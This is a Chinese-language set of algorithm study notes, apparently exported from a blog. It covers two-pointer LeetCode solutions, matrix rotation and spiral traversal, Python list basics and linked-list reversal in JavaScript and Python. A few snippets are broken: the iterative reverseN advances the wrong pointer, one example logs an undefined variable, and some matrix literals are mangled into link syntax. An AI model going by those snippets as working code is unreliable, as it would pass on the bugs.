[删除排序链表中的重复元素](https://leetcode.cn/problems/remove-duplicates-from-sorted-list/)\n\n快慢指针，没命中重复的时候，慢指针直接指向快指针\n\n![image.png|512](https://832-1310531898.cos.ap-beijing.myqcloud.com/f8abbdbe40e8a8b9eb2d364f4359de35.png)\n\n**仔细看这个动图：**\n\n![2.gif|504](https://832-1310531898.cos.ap-beijing.myqcloud.com/8768fd31d20e0d8a00d38911f7c69667.gif)\n\n```javascript\n/**\n * Definition for singly-linked list.\n */\n\nfunction ListNode(val, next) {\n    this.val = (val === undefined ? 0 : val)\n    this.next = (next === undefined ? null : next)\n}\n\n/**\n * @param {ListNode} head\n * @return {ListNode}\n */\nvar deleteDuplicates = function (head) {\n    // 边界条件\n    if (head == null) return null;\n    let slow = head;\n    let fast = head;\n    while (fast !== null) {\n        if (fast.val !== slow.val) {\n            //// :::: 类比于 26题\n            // nums[slow] = nums[fast];\n            slow.next = fast;\n            //// :::: 类比 26题 slow++;\n            slow = slow.next;\n        }\n        // fast++\n        fast = fast.next;\n    }\n    // ::::这一步也很关键 断开与后面重复元素的连接\n    slow.next = null;\n    // notice：这里返回得是head\n    return head;\n};\n\n```\n\n- 这题使用虚拟头结点后，更复杂了，导致都没写出来，其实使用`slow` 指针就好了\n- **别以为懂了，自己再写一遍试试！！！**\n- **关键的是，最终返回**\n\n### 2.3. [移除元素](https://leetcode.cn/problems/remove-element/) \n\n![image.png|544](https://832-1310531898.cos.ap-beijing.myqcloud.com/3dd2122258009b2764e5a56bf6ad006b.png)\n\n```javascript\n/**\n * @param {number[]} nums\n * @param {number} val\n * @return {number}\n */\nvar removeElement = function(nums, val) {\n    let fast = 0;\n    let slow = 0;\n    while (fast < nums.length){\n        if(nums[fast] !== val){\n            // ::::关键，快指针的值给slow的值即可\n            nums[slow] = nums[fast];\n            slow++;\n        }\n        fast++;\n    }\n    return slow;\n};\n```\n\n### 2.4. [移动零](https://leetcode.cn/problems/move-zeroes/)\n\n![image.png|560](https://832-1310531898.cos.ap-beijing.myqcloud.com/27b55f5bb5563215ebf470626989d92b.png)\n\n使用上面的移动元素方法即可：\n\n```javascript\n/**\n * @param {number[]} nums\n * @return {void} Do not return anything, modify nums in-place instead.\n */\n var removeElement = function(nums, val) {\n    let fast = 0, slow = 0;\n    while (fast < nums.length) {\n        if (nums[fast] != val) {\n            nums[slow] = nums[fast];\n            slow++;\n        }\n        fast++;\n    }\n    return slow;\n};\n\nvar moveZeroes = function(nums) {\n    let p = removeElement(nums,0);\n    // 将 nums[p..] 的元素赋值为 0\n    for (; p < nums.length; p++) {\n        nums[p] = 0;\n    }\n};\n```\n\n## 3. 左右指针技巧\n\n### 3.1. 概述\n\n- `left` 指针在后，`right` 指针在前\n\t- 两个指针中间的部分就是「窗口」，算法通过扩大和缩小「窗口」来解决某些问题。\n- 要数组有序，就应该想到双指针技巧\n- 大部分左右指针都是从两端向中间相向而行\n\t- 而回文子串问题则是让左右指针从`中心向两端扩展`。不过这种情况也就回文串这类问题会遇到，所以我也把它归为左右指针了。\n\n### 3.2. 二分查找之双指针特性，左右指针\n\n![image.png|568](https://832-1310531898.cos.ap-beijing.myqcloud.com/b9e550f8ac3d70f74ad328bcc9cb4f58.png)\n\n### 3.3. [两数之和 II](https://leetcode.cn/problems/two-sum-ii-input-array-is-sorted/)\n\n有序，使用左右指针\n\n![image.png|568](https://832-1310531898.cos.ap-beijing.myqcloud.com/143922fffeef921a2a295510f0214715.png)\n\n注意，是**有序的数组**。**使用左右指针**\n\n```javascript\n/**\n * @param {number[]} numbers\n * @param {number} target\n * @return {number[]}\n */\nvar twoSum = function (numbers, target) {\n    // 一左一右两个指针相向而行\n    let left = 0;\n    let right = numbers.length - 1;\n    while (left < right) {\n        // ::::下面都会用的sum这个变量，提出来\n        let sum = numbers[left] + numbers[right]\n        if (sum === target) {\n            // 题目要求的索引是从 1 开始的\n            return [left + 1, right + 1];\n            // :::: sum小于目标值，则移动 left\n        } else if (sum < target) {\n            // ::::疑问 ？ 为什么不能是 right 左边移动\n            // ::::如果right再左移动，这不只会让sum 更小嘛\n            // ::::疑问 ？ 为什么不能是 right 再右边移动，这不也会让sum变得更大吗\n            left++; // 让 sum 大一点\n        } else if (sum > target) {\n            // :::: 疑问 ？ 为什么不能是 left 继续 再左边移动，这不也能让sum变得小一些吗\n            right--; // 让 sum 小一点\n        }\n    }\n    return [-1, -1]\n};\n```\n\n> 代码的疑问：可以想象\n> - 初步的理解是，再往回走的路其实已经在遍历里走过了\n\n### 3.4. 原地 [反转字符串](https://leetcode.cn/problems/reverse-string/)\n\n```javascript\n/**\n * @param {character[]} s\n * @return {void} Do not return anything, modify s in-place instead.\n */\nvar reverseString = function(s) {\n    // 一左一右两个指针相向而行\n    left = 0, right = s.length - 1;\n    while (left < right) {\n        // 交换 s[left] 和 s[right]\n        let temp = s[left];\n        s[left] = s[right];\n        s[right] = temp;\n        left++;\n        right--;\n    }\n};\n```\n\n### 3.5. 回文串判断\n\n使用左右指针\n\n![image.png|536](https://832-1310531898.cos.ap-beijing.myqcloud.com/2ca25d3a52bc21b986911ff282668e97.png)\n\n### 3.6. [最长回文子串](https://leetcode.cn/problems/longest-palindromic-substring/)\n\n![image.png|528](https://832-1310531898.cos.ap-beijing.myqcloud.com/d249938e90b0bcd8292ea46411f54bda.png)\n\n- 先定义一个函数`palindrome(String s, int l, int r)`，去找回文串；解决该问题的核心是从** **中心向两端扩散的双指针技巧\n   - `l = r` 时， 相当于寻找长度为`奇数`的回文串，以 `s[i]` 为中心的回文子串\n   - `l + 1 = r` 时， 相当于寻找长度为`偶数`的回文串，以`s[r]` 为中心的回文子串\n- 那么回到最长回文串的问题，解法的大致思路就是\n\n![image.png|512](https://832-1310531898.cos.ap-beijing.myqcloud.com/f555df58ebdf6c6738a9a497271e21ac.png)\n\n```javascript\n/**\n * @param {string} s\n * @return {string}\n */\nvar longestPalindrome = function (s) {\n    let res = \"\";\n    for (let i = 0; i < s.length; i++) {\n        // 以 s[i] 为中心的最长回文子串\n        let s1 = palindrome(s, i, i);\n        // 以 s[i] 和 s[i+1] 为中心的最长回文子串\n        let s2 = palindrome(s, i, i + 1);\n\n        // 再比较下s1 / res / s2 那个更长\n        if (s1.length > s2.length) {\n            res = res.length > s1.length ? res : s1;\n        } else {\n            res = res.length > s2.length ? res : s2;\n        }\n    }\n    return res;\n};\n\n/**\n * @desc 找下标以l,r 为中心的回文字符串，在 s 中寻找以 s[l] 和 s[r] 为中心的最长回文串\n * @param s 字符串\n * @param l 左下标\n * @param r 右下标\n * @return {string} 回文字符串\n *\n * 注意：\n *  l = r   寻找长度为奇数的回文串\n *  l = r-1 寻找长度为偶数数的回文串\n * */\nfunction palindrome(s, l, r) {\n    while (\n        l >= 0 && r < s.length //  防止索引越界\n        && s[l] === s[r]) {\n        // 向两边展开\n        l--;\n        r++;\n    }\n    // 返回以 s[l] 和 s[r] 为中心的最长回文串\n    return s.substring(l + 1, r);\n}\n```\n\n","w25fiCxw":"\n# 双指针更多习题\n\n`#算法/双指针` \n\n\n## 目录\n<!-- toc -->\n ## [删除排序链表中的重复元素 II](https://leetcode.cn/problems/remove-duplicates-from-sorted-list-ii/) \n\n![image.png|504](https://832-1310531898.cos.ap-beijing.myqcloud.com/d0f092f1eda08b43a7a59eacb1079d02.png)\n\n### 方法一\n\n一个简单粗暴的解法就是借助像`哈希表`这样的数据结构记录哪些节点重复了，然后去掉它们\n\n### 方法二\n\n链表是有序的，这意味着 **重复元素都靠在一起**，其实不用额外的空间复杂度来辅助，用两个指针就可以达到去重的目的，只是细节有点多\n\n```javascript\n/**\n * @param {ListNode} head\n * @return {ListNode}\n */\nvar deleteDuplicates = function (head) {\n    let dummy = new ListNode(-1);\n    // 虚拟头结点\n    let p = dummy;\n    let q = head;\n     // 循环整个链表\n    while (q != null) {\n        if (q.next != null && q.val === q.next.val) {\n            // ::::让指针q 跳过重复元素 start\n            // 发现重复节点，跳过这些重复节点\n            // 循环重复的节点\n            while (q.next != null && q.val === q.next.val) {\n                q = q.next;\n            }\n            q = q.next;\n            // 此时 q 跳过了这一段重复元素\n            // ::::让指针q 跳过重复元素 end\n            // 如果这时候q为空了，说明已经走到最后了，p指针也指向null，遍历完成\n            if (q == null) {\n                p.next = null;\n            }\n            // 不过下一段元素也可能重复，等下一轮 while 循环判断\n        } else {\n            // 不是重复节点，接到 dummy 后面\n            p.next = q;\n\n            // p/q指针分别前进\n            p = p.next;\n            q = q.next;\n        }\n    }\n    return dummy.next;\n};\n```\n\n### 方法三：递归\n\n```javascript\n/**\n * Definition for singly-linked list.\n * function ListNode(val, next) {\n *     this.val = (val===undefined ? 0 : val)\n *     this.next = (next===undefined ? null : next)\n * }\n */\n/**\n * @param {ListNode} head\n * @return {ListNode}\n */\nvar deleteDuplicates = function (head) {\n    // base case\n    if (head == null || head.next == null) {\n        return head;\n    }\n    if (head.val !== head.next.val) {\n        // 如果头结点和身后节点的值不同，则对之后的链表去重即可\n        head.next = deleteDuplicates(head.next);\n        return head;\n    }\n    // 如果如果头结点和身后节点的值相同，则说明从 head 开始存在若干重复节点\n    // 越过重复节点，找到 head 之后那个不重复的节点\n    while (head.next != null && head.val === head.next.val) {\n        head = head.next;\n    }\n    // 直接返回那个不重复节点开头的链表的去重结果，就把重复节点删掉了\n    return deleteDuplicates(head.next);\n};\n\n\n```\n\n## [从未排序的链表中移除重复元素](https://leetcode.cn/problems/remove-duplicates-from-an-unsorted-linked-list)  @ing\n\n![image.png|560](https://832-1310531898.cos.ap-beijing.myqcloud.com/1a305abba2163247d43e842f88c73e60.png)\n\n思路：\n\n- 遍历两次链表，第一次记录哪些值出现重复，然后第二次将无重复的节点分解出来。\n\n## [丑数 II](https://leetcode.cn/problems/ugly-number-ii/) :  即找从1开始的，第n个丑数是？ @ing\n\n![image.png|584](https://832-1310531898.cos.ap-beijing.myqcloud.com/c483bd00f16f8c3f0cc899a1cab96a62.png)\n\n思路：\n![image.png|552](https://832-1310531898.cos.ap-beijing.myqcloud.com/d4d28ccaba7cb7ec3609e77d56b7b95e.png)\n\n> 边走边构造数组！\n\n```javascript\n/**\n * @param {number} n\n * @return {number}\n */\nvar nthUglyNumber = function(n) {\n    // 可以理解为三个指向有序链表头结点的指针\n    let p2 = 1, p3 = 1, p5 = 1;\n\n    // 可以理解为 三个有序链表的头节点的值\n    let product2 = 1, product3 = 1, product5 = 1;\n\n    // 可以理解为最终合并的有序链表（结果链表）\n    let ugly = [];\n    // 可以理解为结果链表上的指针\n    let p = 1;\n\n    // 开始合并三个有序链表\n    while (p <= n) {\n        // 取三个链表的最小结点\n        let min = Math.min(Math.min(product2, product3), product5);\n        // 接到结果链表上\n        ugly[p] = min;\n        p++;\n        // 前进对应有序链表上的指针\n        if (min === product2) {\n            product2 = 2 * ugly[p2];\n            p2++;\n        }\n        if (min === product3) {\n            product3 = 3 * ugly[p3];\n            p3++;\n        }\n        if (min === product5) {\n            product5 = 5 * ugly[p5];\n            p5++;\n        }\n    }\n    // 返回第 n 个丑数\n    return ugly[n];\n};\n```\n\n## [有序矩阵中第 K 小的元素](https://leetcode.cn/problems/kth-smallest-element-in-a-sorted-matrix) @ing\n![image.png](https://832-1310531898.cos.ap-beijing.myqcloud.com/e2e3ff2f0ca4352e5732a855acaeab67.png)\n\n> **思路：**\n> 其实是  [23. 合并K个升序链表](https://leetcode.cn/problems/merge-k-sorted-lists) 的变体。\n> 矩阵中的每一行都是排好序的，就好比多条有序链表，你用优先级队列施展合并多条有序链表的逻辑就能找到第 k 小的元素了。\n\n## [查找和最小的 K 对数字](https://leetcode.cn/problems/find-k-pairs-with-smallest-sums) @todo\n\n![image.png|568](https://832-1310531898.cos.ap-beijing.myqcloud.com/64f054491b8734f8e9bc7bbf8d2abc00.png)\n\n","6kvWei9x":"\n# 二维数组的遍历技巧\n\n`#2023/05/27` `#算法` \n\n\n## 目录\n<!-- toc -->\n ## 重要性 \n\n- 动态规划 经常需要 遍历`二维 dp 数组`\n- 二维遍历，既考验编程能力，也考验一些技巧性思路\n\n## 如何初始化一个二维数组\n\n```javascript\n/**\n * @description 初始化一个 3* 5 的二维数组，每个元素都是'.'\n * *\n */\nconst row = 3;\nconst col = 5;\nconst matrix = Array.from({length: row}, () => Array(col).fill('*'));\nconsole.log(array);\n\n\n\n// 或者如下\n\n// n*n\nlet matrix = new Array(n).fill().map(() => new Array(n).fill(0));\n// m*n\nlet matrix = new Array(m).fill().map(() => new Array(n).fill(0));\n\n```\n\n\n### 关于 Array.fill 的用法\n\n```javascript\nfill(value)\nfill(value, start)\nfill(value, start, end)\n\n比如：\nconsole.log([1, 2, 3].fill()); // [undefined, undefined, undefined]\n\nconst array1 = [1, 2, 3, 4];\n\n// Fill with 0 from position 2 until position 4\nconsole.log(array1.fill(0, 2, 4));\n// Expected output: Array [1, 2, 0, 0]\n\n// Fill with 5 from position 1\nconsole.log(array1.fill(5, 1));\n// Expected output: Array [1, 5, 5, 5]\n\nconsole.log(array1.fill(6));\n// Expected output: Array [6, 6, 6, 6]\n\n```\n\n## 第 48 题「 旋转图像」\n[https://leetcode.cn/problems/rotate-image/](https://leetcode.cn/problems/rotate-image/)\n![|560](https://832-1310531898.cos.ap-beijing.myqcloud.com/4d0161a82c1385f3d0a19ae0f6d5d7a7.png)\n\n这里要求原地，参考 [#`原地`反转所有单词的顺序](/post/6kvWei9x.html#`原地`反转所有单词的顺序) , 所以，这里常规思路搞不定，得换一种思路，如下图：\n\n![|528](https://832-1310531898.cos.ap-beijing.myqcloud.com/e5e22046d222a014b97696f67742a6f3.png)\n[https://www.figma.com/file/hT9k2YbVvV1UIITtUmbJ0C/2023.05.LOG?type=whiteboard&node-id=147-180&t=sZSmw8G9XgtflSer-4](https://www.figma.com/file/hT9k2YbVvV1UIITtUmbJ0C/2023.05.LOG?type=whiteboard&node-id=147-180&t=sZSmw8G9XgtflSer-4)\n\n```javascript\nlet rotate = function (matrix) {\n    let n = matrix.length;\n    // 先沿【对角线】镜像对称二维矩阵\n    // :::: 交换 matrix[i][j] 和 matrix[j][i]\n    for (let i = 0; i < n; i++) {\n        // ::::这里 j=i，遍历第 i 行后，只需要交换对称线右上方的元素即可\n        //  如果 j 从 0 开始，会把对称线左下方的元素也交换了，即相当于根本就没有交互\n        for (let j = i ; j < n; j++) {\n            let temp = matrix[i][j];\n            matrix[i][j] = matrix[j][i];\n            matrix[j][i] = temp;\n        }\n    }\n    // 然后反转二维矩阵的【每一行】\n    for (let row of matrix) {\n        reverse(row);\n    }\n}\n\n/**\n * 同样使用双指针技巧实现数组的翻转\n * */\nlet reverse = function (arr) {\n    let i = 0,\n        j = arr.length - 1;\n    while (j > i) {\n        let temp = arr[i];\n        arr[i] = arr[j];\n        arr[j] = temp;\n        i++;\n        j--;\n    }\n}\n\n\nlet matrix = [1, 2, 3], [4, 5, 6], [7, 8, 9](/post/6kvWei9x.html#1,-2,-3],-[4,-5,-6],-[7,-8,-9);\nlet matrix2 = [5,1,9,11],[2,4,8,10],[13,3,6,7],[15,14,12,16](/post/6kvWei9x.html#5,1,9,11],[2,4,8,10],[13,3,6,7],[15,14,12,16)\n// 原地修改两个数组\nrotate(matrix);\nrotate(matrix2);\nconsole.log(matrix);\nconsole.log(matrix2);\n\n```\n\n> [!question]\n注意点：为什么交换 `matrix[i][j]` 和 `matrix[j][i]` 时，`内层循环`  从 `j = i`  开始？ \n\n上面的问题可以见代码注释部分，另外这里补充下，其实只需要遍历`矩阵的右上角`的节点即可，如下图：\n\n![|523](https://832-1310531898.cos.ap-beijing.myqcloud.com/78b544d487864599f32230c85f8b5653.png)\n\n\n### 延伸：逆时针呢？\n同理，分为两步骤，如下图：\n\n- `【对角线】`如下图进行旋转\n- 按 `每行`进行翻转即可\n\n![](https://832-1310531898.cos.ap-beijing.myqcloud.com/38251901ae383aee191c67ff3215c5dd.png)\n\n所以根据上面的代码，修改如下即可：\n```javascript\nlet rotate = function (matrix) {\n    let n = matrix.length;\n    // 先沿【对角线】镜像对称二维矩阵\n    for (let i = 0; i < n; i++) {\n        //   问题 1： 这里为什么是 j < n-i  ?\n        //   问题 2 ： 为什么是 matrix[n - j - 1][n - i - 1] ？ \n        for (let j = 0; j < n - i; j++) {\n            let temp = matrix[i][j];\n            matrix[i][j] = matrix[n - j - 1][n - i - 1];\n            matrix[n - j - 1][n - i - 1] = temp;\n        }\n    }\n\n    // 然后反转二维矩阵的【每一行】\n    for (let row of matrix) {\n        reverse(row);\n    }\n}\n\n/**\n * 同样使用双指针技巧实现数组的翻转\n * */\nlet reverse = function (arr) {\n    let i = 0,\n        j = arr.length - 1;\n    while (j > i) {\n        let temp = arr[i];\n        arr[i] = arr[j];\n        arr[j] = temp;\n        i++;\n        j--;\n    }\n}\n\nlet matrix = [1, 2, 3], [4, 5, 6], [7, 8, 9](/post/6kvWei9x.html#1,-2,-3],-[4,-5,-6],-[7,-8,-9);\nlet matrix2 = [5,1,9,11],[2,4,8,10],[13,3,6,7],[15,14,12,16](/post/6kvWei9x.html#5,1,9,11],[2,4,8,10],[13,3,6,7],[15,14,12,16)\n// 原地修改两个数组\nrotate(matrix);\nrotate(matrix2);\nconsole.log(matrix);\nconsole.log(matrix2);\n\n```\n\n\n#### 问题 1： 这里为什么是 `j < n-i` ?\n同理，主需要遍历左上方的元素即可，如下图\n![](https://832-1310531898.cos.ap-beijing.myqcloud.com/5c79091c2e1c0d40a6753f3562be1baf.png)\n\n\n#### 问题 2：问题 2 ： 为什么是 `matrix[n - j - 1][n - i - 1]`  ？\n以 `i = 0  j = 1` 为例，   `这里 2 = matrix[0][1]  对应着 最下方 4 即位置 matrix[2][3]`  ，即  `matrix[n - j - 1][n - i - 1]` ，如下图：\n![](https://832-1310531898.cos.ap-beijing.myqcloud.com/83fbccd21fc08bfecf9349db5c1b0172.png)\n\n\n## 第 151 题「 颠倒字符串中的单词」\n\n[https://leetcode.cn/problems/reverse-words-in-a-string/submissions/](https://leetcode.cn/problems/reverse-words-in-a-string/submissions/)\n[https://leetcode.cn/problems/fan-zhuan-dan-ci-shun-xu-lcof/](https://leetcode.cn/problems/fan-zhuan-dan-ci-shun-xu-lcof/)\n\n### `原地`反转所有单词的顺序\n```javascript\ns = \"hello world labuladong\"\n// 你的算法需要原地反转这个字符串中的单词顺序,如下：\ns = \"labuladong world hello\"\n```\n常规的做法肯定搞不定，比如 `split(‘ ’)` 成数组，然后 `reverse` 后再 `join`, 它使用了额外的空间，`非原地` , 正确的思路如下：\n![|534](https://832-1310531898.cos.ap-beijing.myqcloud.com/a449923b54462a1f483662d7e0307f77.png)\n是否能够实现原地，主要的差别是有些语言的`字符串不可变`（如 Java 和 Python、`JavaScript` )，有些语言的`字符串可变`（如 C++) ，如下图：\n![|544](https://832-1310531898.cos.ap-beijing.myqcloud.com/4daff65b60b2e2646a5d50249575c0ed.png)\n![|552](https://832-1310531898.cos.ap-beijing.myqcloud.com/d13fa9892c9afb82460184b95475fc36.png)\n所以，还是需要借助额外的空间，以下是其中一种解法，当然它不是原地的\n```javascript\nlet s1 = \"hello   world    labuladong  \";\n\n/**\n * 去除多余空格\n * */\nfunction removeSpace(s1) {\n    return s1.trim().replace(/\\s+/g,' ');\n}\n\n/**\n * 使用双指针技巧实现字符串的翻转\n * */\nfunction reverseString(str) {\n    let left = 0;  // 左指针\n    let right = str.length - 1;  // 右指针\n    let arr = removeSpace(str).split('');  // 将字符串转换为字符数组\n    while (left < right) {\n        // 交换左右指针指向的字符\n        const temp = arr[left];\n        arr[left] = arr[right];\n        arr[right] = temp;\n        // 移动指针\n        left++;\n        right--;\n    }\n    return arr.join('');  // 将字符数组转换回字符串\n}\nconsole.log(reverseString(s1)); // gnodulab dlrow olleh\n\n\n/**\n * @param {string} s\n * @return {string}\n */\nvar reverseWords = function(s) {\n    const newStr = reverseString(s);\n    const arr = newStr.split(' ');\n    const res = [];\n    for (let i = 0; i < arr.length; i++) {\n        res.push(reverseString(arr[i]));\n    }\n    return res.join(' ');\n};\n\nconsole.log(reverseWords(s1)); // labuladong world hello\n\n```\n\n\n### 错误日志\n因为高亮了吧，正则竟然加了一个`''` \n![](https://832-1310531898.cos.ap-beijing.myqcloud.com/6b83a36798533f50597fb8d739149975.png)\n\n\n### 复杂度分析\n![](https://832-1310531898.cos.ap-beijing.myqcloud.com/6722480a16c8d523ba166e6eda60cdab.png)\n\n### 那么js 版本的原地算法呢？\nTODO \n\n\n\n## 第 54 题「 螺旋矩阵」\n[https://leetcode.cn/problems/spiral-matrix/](https://leetcode.cn/problems/spiral-matrix/)\n注意：本题与主站 54 题相同： [https://leetcode-cn.com/problems/spiral-matrix/](https://leetcode-cn.com/problems/spiral-matrix/)\n\n![|512](https://832-1310531898.cos.ap-beijing.myqcloud.com/41214baa7400a69c0456e10418deac3b.png)\n分析，如`fj`\n[https://www.figma.com/file/hT9k2YbVvV1UIITtUmbJ0C/2023.05.LOG?type=whiteboard&node-id=151-215&t=ONxyxYCCotSe5XMX-4](https://www.figma.com/file/hT9k2YbVvV1UIITtUmbJ0C/2023.05.LOG?type=whiteboard&node-id=151-215&t=ONxyxYCCotSe5XMX-4) \n\n> [!info]\n 上图中，其实按照序号及图示遍历即可，每个变量应该如何遍历，是 `++` 还是 `--` ，上图中都有标注，所以把上面的思路翻译成代码即可\n\n以下是==代码==部分：\n```javascript\nlet spiralOrder = function (matrix) {\n    let m = matrix.length, n = matrix[0].length;\n    let top = 0, bottom = m - 1;\n    let left = 0, right = n - 1;\n    let res = [];\n    // res.length == m * n 则遍历完整个数组\n    while (res.length < m * n) {\n        if (top <= bottom) {\n            // 在顶部从左向右遍历\n            for (let j = left; j <= right; j++) {\n                res.push(matrix[top][j]);\n            }\n            // 上边界下移\n            top++;\n        }\n        if (left <= right) {\n            // 在右侧从上向下遍历\n            for (let i = top; i <= bottom; i++) {\n                res.push(matrix[i][right]);\n            }\n            // 右边界左移\n            right--;\n        }\n        if (top <= bottom) {\n            // 在底部从右向左遍历\n            for (let j = right; j >= left; j--) {\n                res.push(matrix[bottom][j]);\n            }\n            // 下边界上移\n            bottom--;\n        }\n        if (left <= right) {\n            // 在左侧从下向上遍历\n            for (let i = bottom; i >= top; i--) {\n                res.push(matrix[i][left]);\n            }\n            // 左边界右移\n            left++;\n        }\n    }\n    return res;\n};\n\n```\n\n## 第 59 题「 螺旋矩阵 II」\n\n[https://leetcode.cn/problems/spiral-matrix/submissions/](https://leetcode.cn/problems/spiral-matrix/submissions/)\n\n![|664](https://832-1310531898.cos.ap-beijing.myqcloud.com/97b95ae85185a62c14542dd767684e44.png)\n\n\n## 最后总结\n\n- 注意如何初始化一个`二维数组`，常用两种方式\n- 无论顺时针还是逆时针，按对角线旋转一个二维数组，两个步骤\n   - 记得按对角线 `交换元素`\n   - 然后按照`列`翻转\n- 顺时针或逆时针 打印二维数组，**记得画图**，更新四个变量即可\n\n\n## 参考\n[https://labuladong.github.io/algo/di-yi-zhan-da78c/shou-ba-sh-48c1d/er-wei-shu-150fb/](https://labuladong.github.io/algo/di-yi-zhan-da78c/shou-ba-sh-48c1d/er-wei-shu-150fb/)\n","qDxIH4HS":"\n# 列表：Python 描述\n\n`#数据结构/列表` `#数据结构` \n\n\n列表（list）是一个抽象的数据结构概念，它表示元素的有序集合，支持元素访问、修改、添加、删除和遍历等操作，无须使用者考虑容量限制的问题。列表可以基于链表或数组实现。\n\n**许多编程语言中的标准库提供的列表是基于动态数组实现的**，例如\n- Python 中的 `list` \n- Java 中的 `ArrayList` \n- Js 的 `Array` \n\n\n## 目录\n<!-- toc -->\n ## 1. 初始化与更新 \n\n\n```python\n##############################\n### 初始化列表\n##############################\nnum1:list[int] = [1, 2, 3, 4, 5]\n\n######### 列表的访问：复杂度为 O(1)\nprint(num1[0])  # 查\nnum1[0] = 0 # 更新\n```\n\n## 2. 列表的插入：复杂度为 O(n)\n\n```python\n##############################\n### 列表的插入：复杂度为 O(n)\n##############################\n\n# 清空列表\nnum1.clear()\n\n# 头部插入\n# insert(index, value) index 为插入的位置，value 为插入的值\nnum1.insert(0, 1) # 复杂度为 O(n)\n# 尾部插入\nnum1.append(2) # 复杂度为 O(1)\n# 中间插入\nnum1.insert(1, 3) # 复杂度为 O(n)\n```\n\n## 3. 列表的遍历：复杂度为 O(n)\n\n```python\n##############################\n### 列表的遍历：复杂度为 O(n)\n##############################\n\n# 方式一\nfor i in num1:\n    print(i)\n\n# 方式二\nfor i in range(len(num1)):\n    print(num1[i])\n```\n\n## 4. 拼接列表\n\n```python\n##############################\n### 拼接列表\n##############################\nnum1 = [1, 2, 3, 4, 5]\nnum2 = [6, 7, 8, 9, 10]\n\n# 方式一：使用 extend 方法\n# ## 缺点：改变了原始的 num1\nnum1.extend(num2)\n\n# 方式二：使用 + 运算符\n### 缺点：创建了新的列表\nnew_list = num1 + num2\n\n# 方式三：使用 * 运算符和列表解包\n### 缺点：不适用于大列表,在 Python 3.5 之前的版本中不支持\nnew_list = [*num1, *num2]\n\n# 方式四：使用列表解析\n### 缺点：不适用于大列表\nnew_list = [i for i in num1] + [i for i in num2]\n\nresult = [item for list in (num1, num2) for item in list]\n```\n\n### 4.1. 关于列表解析的说明\n\n![图片](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240921070210.png)\n\n### 4.2. 列表的删除\n\n```python\n##############################\n### 列表的删除：复杂度为 O(n)\n##############################\nnum1 = [1, 2, 3, 4, 5]\n# remove 方法: 删除第一个匹配的元素,如果没有找到会报错\n# remove(item) item 为需要删除的元素\nnum1.remove(3) # 删除第一个 3\n\n# pop 方法: 删除指定索引的元素,参数为索引\nnum1.pop(1) # 删除索引为 1 的元素\n\n# clear 方法: 清空列表\nnum1.clear()\n\n# del 方法: 删除指定索引的元素,参数为索引\ndel num1[1] # 删除索引为 1 的元素\n# 删除整个列表\ndel num1\n\n```\n\n## 5. 列表的排序\n\n```python\n\n##############################\n### 列表的排序\n##############################\nnum1 = [1, 3, 2, 5, 4]\nnum1.sort() # 默认升序\nnum1.sort(reverse=True) # 降序\n```\n\n\n## 6. 列表的实现原理\n\n许多编程语言内置了列表，例如 Java、C++、Python 等。它们的实现比较复杂，各个参数的设定也非常考究，例如**初始容量、扩容倍数**等。\n\n为了加深对列表工作原理的理解，我们尝试实现一个简易版列表，包括以下三个重点设计。\n- **初始容量**：选取一个合理的数组初始容量。\n- **数量记录**：声明一个变量 `size` ，用于记录列表当前元素数量，并随着元素插入和删除实时更新。根据此变量，我们可以定位列表尾部，以及判断是否需要扩容。\n- **扩容机制**：若插入元素时列表容量已满，则需要进行扩容。先根据扩容倍数创建一个更大的数组，再将当前数组的所有元素依次移动至新数组。\n\t- 比如设置`扩容倍数` \n","eCDCTN9z":"\n# 反转单链表：反转全部、反转前 N 个节点、反转一部分\n\n\n\n\n## 目录\n<!-- toc -->\n ## 1. 反转单链表 \n\n### 1.1. 题目\n\nhttps://leetcode.cn/problems/reverse-linked-list/\n\n![image.png|543](https://832-1310531898.cos.ap-beijing.myqcloud.com/a444f3cfa45e08ed2455b6d3a6ed5679.png)\n\n这个算法常常拿来显示递归的巧妙和优美\n\n对于递归算法，**最重要的就是明确递归函数的定义**:  输入一个节点 `head`，将「以 `head` 为起点」的链表反转，并返回反转之后的头结点 \n\n### 1.2. 代码实现\n\n```javascript\n/**\n * @param {ListNode} head\n * @return {ListNode}\n */\n\nvar reverseList = function(head) {\n  // ① base case \n  if(head === null || head.next === null){\n        return head;\n   }\n  // ② 递归\n  let last = reverseList(head.next)\n  // ③ 上面的递归完成后，这时候只需要 `第二个节点` 处理后面的节点指向即可\n  head.next.next = head;\n  head.next = null;\n  // ④ 返回 last\n  return last;\n};\n```\n\n### 1.3. 分析：见下面的流程图\n\nhttps://www.figma.com/file/9busNTH6MZx5E6ZU8Xfahx/2023.07?type=whiteboard&node-id=1-159&t=CYZxXXoabx9ztccc-4\n\n> [!info]\n> - 不要跳进递归（你的脑袋能压几个栈呀？）\n> - 不要想着彻底理解它，仔细看上面的流程图即可\n\n## 2. 反转链表前 N 个节点\n\n### 2.1. 迭代解法\n\n两步，如下图\n\n1. 将 1 2 3 变成 3 2 1 如下图标注中的 `①`\n2. 将 1 指向 4 ，如下图中的 `②`\n \n![image.png|510](https://832-1310531898.cos.ap-beijing.myqcloud.com/5fb53c7d851607b64d3ad4b6ef17f25c.png)\n\n> [!danger]\n> - 上图标注的红色的 `① ②` ，然后正常写递归就好了\n> - 注意两个变量 `curr` 和 `prev`，你应该就能写出了\n\n```javascript\nfunction reverseN(head, n) {\n  // 迭代，解法， \n  // 第 ① 步：操作链表的指针\n  var curr = head;\n  var prev = null;\n  for (var i = 0; i < n; i++) {\n\t// 下面两行代码就是更换位置\n    curr.next = prev; \n    prev = curr; \n    // 然后，前进\n    curr = curr.next;\n  }\n  // 第 ② 步：递归完后，还需要处理指向\n  head.next = curr;\n  return prev;\n}\n\n```\n\n### 2.2. 递归解法\n\n> [!danger]\n> 再看又不好理解了，pass 吧，看迭代解法即可，时间有限，点到位置\n\n```javascript\n\nvar successor = null; // 后驱节点\n\n// 反转以 head 为起点的 n 个节点，返回新的头结点\nfunction reverseN(head, n) {\n    // ① base case\n    // 反转一个元素，就是它本身，同时要记录后驱节点\n    if (n === 1) {\n        // 记录第 n + 1 个节点\n        successor = head.next;\n        return head;\n    }\n    // ② 递归\n    // 以 head.next 为起点，需要反转前 n - 1 个节点\n    var last = reverseN(head.next, n - 1);\n\t// ③ 处理递归后的节点指向\n    head.next.next = head;\n    // 让反转之后的 head 节点和后面的节点连起来\n    head.next = successor;\n    // ④ 返回 last 即可\n    return 